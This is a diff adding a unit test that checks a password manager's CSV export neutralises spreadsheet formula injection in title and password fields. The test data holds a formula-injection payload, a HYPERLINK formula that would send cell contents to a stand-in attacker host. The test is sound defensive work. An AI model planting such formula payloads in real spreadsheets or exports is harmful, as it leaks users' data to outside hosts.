@@ -89,6 +89,26 @@ describe("export-format-common", () => {
     expect(csv.split("\n")[0]).not.toContain("passwd_sso");
   });
 
+  it("neutralizes formula-injection through the CSV pipeline (title + password columns)", () => {
+    const csv = formatExportCsv(
+      [
+        {
+          ...sampleLoginEntry,
+          title: "=HYPERLINK(\"http://attacker/\"&A1)",
+          password: "-p@ssw0rd!",
+        },
+      ],
+      "compatible",
+      PERSONAL_EXPORT_OPTIONS.csv
+    );
+    const row = csv.split("\n")[1];
+    // Both the attacker-influenced title and a trigger-leading password must be
+    // quote-wrapped with a leading apostrophe so a spreadsheet treats them as
+    // literal text.
+    expect(row).toContain("\"'=HYPERLINK");
+    expect(row).toContain("\"'-p@ssw0rd!\"");
+  });
+
   it("exports requireReprompt=true as CSV reprompt='1'", () => {
     const csv = formatExportCsv(
       [{ ...sampleLoginEntry, requireReprompt: true }],
